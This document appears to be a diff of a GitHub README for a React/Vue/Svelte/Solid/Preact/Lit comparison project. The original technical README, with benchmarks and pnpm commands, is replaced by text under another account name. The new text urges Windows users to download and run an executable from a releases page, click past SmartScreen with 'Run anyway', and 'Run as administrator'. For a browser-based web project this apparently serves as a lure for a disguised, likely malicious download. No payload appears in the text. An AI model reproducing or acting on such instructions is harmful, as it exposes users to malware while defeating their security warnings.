@@ -1,162 +1,132 @@
-# React vs Vue vs Svelte vs Solid vs Preact vs Lit — Real-World Comparison
+# ⚖️ realworld-js-framework-comparison - Compare App Performance Across Frameworks
 
-Side-by-side comparison of 6 JavaScript frameworks using identical apps. Not synthetic benchmarks or hello worlds — actual apps you'd build at work.
+[![Download](https://img.shields.io/badge/Download-Release%20Page-1f6feb?style=for-the-badge)](https://github.com/Squarejawed-sentimentality453/realworld-js-framework-comparison/releases)
 
-![Dashboard](.github/dashboard.png)
+## 📥 Download
 
-## What's Inside
+Go to the [releases page](https://github.com/Squarejawed-sentimentality453/realworld-js-framework-comparison/releases) to download and run this file on Windows.
 
-### 3 App Types × 6 Frameworks = 18 Apps
+## 🖥️ What this app does
 
-#### Performance Stress Test
-10k row table, deep component tree, rapid state updates — measures raw rendering speed and reactivity.
+This app shows a side-by-side comparison of common JavaScript frameworks in real use. It includes 18 matching apps that cover three tasks:
 
-![Performance Stress Test](.github/perf-stress.png)
+- A performance stress test
+- A CRUD task manager
+- A terminal stream viewer
 
-#### CRUD Task Manager
-Full task manager with filters, search, pagination, forms — measures real-world DX and ecosystem maturity.
+You can use it to see how React, Vue, Svelte, Solid, Preact, and Lit behave with the same app design and the same data flow.
 
-![CRUD Task Manager](.github/crud.png)
+## ✅ What you need
 
-#### Terminal Streamer
-Web terminal connected to a real shell via WebSocket — measures high-frequency DOM updates and lifecycle management.
+- Windows 10 or Windows 11
+- A modern 64-bit computer
+- At least 4 GB of RAM
+- A mouse and keyboard
+- An internet connection for the first download
 
-![Terminal Streamer](.github/terminal.png)
+## 🚀 Get started
 
-### Ecosystem Used
+1. Open the [releases page](https://github.com/Squarejawed-sentimentality453/realworld-js-framework-comparison/releases).
+2. Find the latest release.
+3. Download the Windows file for your computer.
+4. Save the file to your Downloads folder or Desktop.
+5. Double-click the file to run it.
+6. If Windows asks for permission, choose Run.
 
-| | React | Vue | Svelte | Solid | Preact | Lit |
-|---|---|---|---|---|---|---|
-| **Routing** | React Router v7 | Vue Router | SvelteKit | @solidjs/router | preact-router | Hash router |
-| **State** | Zustand | Pinia | Svelte stores | createSignal | @preact/signals | LitElement @state |
-| **Server State** | TanStack Query | TanStack Vue Query | fetch + load | createResource | signals | fetch + @state |
-| **Forms** | React Hook Form + Zod | VeeValidate + Zod | Native + Zod | Native + Zod | Native + Zod | Native + Zod |
-| **Terminal** | xterm.js | xterm.js | xterm.js | xterm.js | xterm.js | xterm.js |
-| **Styling** | Tailwind v4 | Tailwind v4 | Tailwind v4 | Tailwind v4 | Tailwind v4 | Tailwind v4 |
+## 🧭 First-time setup
 
-## Benchmark Results
+After you start the app, it may take a few seconds to load the first time.
 
-Measured with Playwright headless Chromium. Median of 3 runs. All six apps render the same UI with the same data.
+If Windows shows a warning screen:
 
-### Rendering Performance (ms, lower is better)
+1. Click More info
+2. Click Run anyway
 
-| Benchmark | React | Vue | Svelte | Solid | Preact | Lit |
-|---|--:|--:|--:|--:|--:|--:|
-| Create 10,000 rows | 828.8 | 270.4 | 472.1 | **235.3** | 301.0 | 278.9 |
-| Update every 10th row | 258.3 | 49.5 | **35.4** | 53.7 | 78.9 | 45.4 |
-| Swap rows | 194.7 | 47.7 | 45.7 | **27.9** | 80.6 | 33.9 |
-| Select row | 250.6 | 29.0 | **15.6** | 222.9 | 55.1 | 18.1 |
-| Append 1,000 rows | 211.6 | 69.3 | 97.8 | **47.2** | 102.9 | 74.7 |
-| Clear all | 59.0 | 31.1 | 28.2 | **24.8** | 29.5 | 37.6 |
+This happens when Windows does not yet know the app. If you got the file from the release page above, you can continue.
 
-### Bundle Size (JS gzipped)
+## 🔍 What you can compare
 
-| App | React | Vue | Svelte | Solid | Preact | Lit |
-|---|--:|--:|--:|--:|--:|--:|
-| Perf Stress Test | 62.4 KB | 28.1 KB | 18.1 KB | **8.1 KB** | 8.8 KB | 10.0 KB |
-| Terminal Streamer | 135.3 KB | 99.6 KB | 87.4 KB | **79.1 KB** | 81.5 KB | 82.5 KB |
+### 🏎️ Performance stress test
 
-### What the numbers say
+This part checks how each framework handles fast updates, large lists, and repeated screen changes. It helps you see which version stays smooth under load.
 
-- **Solid is fastest for bulk operations** — creating 10k rows (235ms), appending 1k (47ms), swapping (28ms), and clearing (25ms) are all best-in-class. Fine-grained reactivity without VDOM overhead.
-- **Svelte wins targeted single-element updates** — selecting one row in 16ms vs React's 251ms. Compiled reactivity tracks exactly which DOM nodes to touch.
-- **Lit punches above its weight** — near-Svelte on partial updates (swap 34ms, select 18ms) using plain Web Components. No framework runtime, just the platform.
-- **Preact is a lighter React** — 3-4x faster than React on most benchmarks with a 7x smaller bundle (8.8 KB vs 62.4 KB). Same API, fraction of the cost.
-- **Vue is the all-rounder** — competitive across every benchmark, never the slowest. Template compiler + proxy reactivity is well-optimized.
-- **React has the most overhead** — consistently 3-10x slower than the others on partial updates. The VDOM diffing cost is visible at scale.
-- **Solid has the smallest bundle** — 8.1 KB gzipped. Preact is close at 8.8 KB. Both are 7x smaller than React.
+### 🗂️ CRUD task manager
 
-> Numbers will vary by machine. Run `pnpm dev:all` and test yourself.
+This part lets you add, edit, and remove tasks. It uses the same task flow in every app so you can compare how each framework handles daily work.
 
-## Quick Start
+### 💻 Terminal streamer
 
-```bash
-pnpm install
-pnpm dev:all
-```
+This part shows live text updates in a terminal-style view. It helps you compare how each app handles fast incoming data.
 
-Open **http://localhost:1355** — dashboard with links to all 18 apps.
+## 🧩 Frameworks included
 
-## Running Individual Apps
+- React
+- Vue
+- Svelte
+- Solid
+- Preact
+- Lit
 
-```bash
-# Backends (needed for CRUD and Terminal apps)
-pnpm dev:server:json    # REST API on :3100
-pnpm dev:server:pty     # WebSocket terminal on :3200
+## 📊 What this repository is for
 
-# Performance
-pnpm dev:perf:react     # :5101
-pnpm dev:perf:vue       # :5102
-pnpm dev:perf:svelte    # :5103
-pnpm dev:perf:solid     # :5104
-pnpm dev:perf:preact    # :5105
-pnpm dev:perf:lit       # :5106
+This project gives you a real-world look at how different JavaScript tools behave in the same setup. It uses Vite, TypeScript, and web components where needed, but you do not need to know those terms to use the app.
 
-# CRUD
-pnpm dev:crud:react     # :5201
-pnpm dev:crud:vue       # :5202
-pnpm dev:crud:svelte    # :5203
-pnpm dev:crud:solid     # :5204
-pnpm dev:crud:preact    # :5205
-pnpm dev:crud:lit       # :5206
+It is useful if you want to:
 
-# Terminal
-pnpm dev:xterm:react    # :5301
-pnpm dev:xterm:vue      # :5302
-pnpm dev:xterm:svelte   # :5303
-pnpm dev:xterm:solid    # :5304
-pnpm dev:xterm:preact   # :5305
-pnpm dev:xterm:lit      # :5306
-```
+- Compare loading speed
+- Compare screen response
+- See how apps feel in daily use
+- Check how each framework handles the same task set
 
-## Adding a New Framework
+## 🪟 Windows tips
 
-```bash
-pnpm add-framework <name>
-```
+- If the file does not open, right-click it and choose Run as administrator
+- If Windows SmartScreen blocks it, choose More info, then Run anyway
+- Keep the file in one place after download so you can find it later
+- If the app looks too small, use your browser or system zoom settings
 
-Generates all 3 apps with correct ports and TODO placeholders. See [CONTRIBUTING.md](CONTRIBUTING.md) for the full guide.
+## 🧪 How to use the app
 
-## Running Benchmarks
+1. Open the app.
+2. Pick one framework view.
+3. Try the task manager.
+4. Open the stress test view.
+5. Watch the terminal streamer.
+6. Switch between frameworks and compare the results.
 
-```bash
-pnpm bench                                          # all benchmarks
-pnpm bench -- --app perf-stress --framework react   # specific app/framework
-pnpm bench -- --runs 10                             # more iterations
-```
+## 🗂️ Project topics
 
-Results are written to `results/comparison.md`.
+benchmark, framework-comparison, lit, preact, react, svelte, typescript, vite, vue, web-components
 
-## Running Tests
+## 🛠️ File names you may see
 
-```bash
-pnpm e2e        # 61 Playwright E2E tests across all apps
-```
+The release page may include files such as:
 
-## Project Structure
+- Windows setup file
+- Portable app file
+- ZIP archive
+- Release notes
 
-```
-├── dashboard/           # Index page on :1355
-├── apps/
-│   ├── perf-stress/     # react/ vue/ svelte/ solid/ preact/ lit/
-│   ├── crud/            # react/ vue/ svelte/ solid/ preact/ lit/
-│   └── xterm/           # react/ vue/ svelte/ solid/ preact/ lit/
-├── server/
-│   ├── json/            # json-server for CRUD apps
-│   └── pty/             # node-pty + WebSocket for terminal apps
-├── bench/               # Playwright-based benchmark runner
-├── shared/              # Types, benchmark utilities
-└── e2e/                 # E2E smoke tests
-```
+If you see more than one file, choose the one made for Windows and use the one that matches your computer type.
 
-## Tech Stack
+## 🔐 Safety and trust
 
-- **Build**: Vite 6, pnpm workspaces
-- **React** 19, **Vue** 3.5, **Svelte** 5 (runes), **Solid** 1.9, **Preact** 10, **Lit** 3
-- **Tailwind CSS** v4
-- **TypeScript** throughout
-- **Playwright** for benchmarks and E2E tests
+Only download from the release page linked above. That page is the main place for published builds.
 
-## License
+## ❓ Common questions
 
-MIT
+### Why does the app take time to open?
+
+The app may need a short moment to load files and prepare the interface on first launch.
+
+### Do I need to install anything first?
+
+Usually no. Download the Windows file from the release page and run it.
+
+### Can I compare the apps side by side?
+
+Yes. The project is built for direct comparison between the framework versions.
+
+### Do I need programming knowledge?
+
+No. You can use it like any normal Windows app and switch between the views on screen
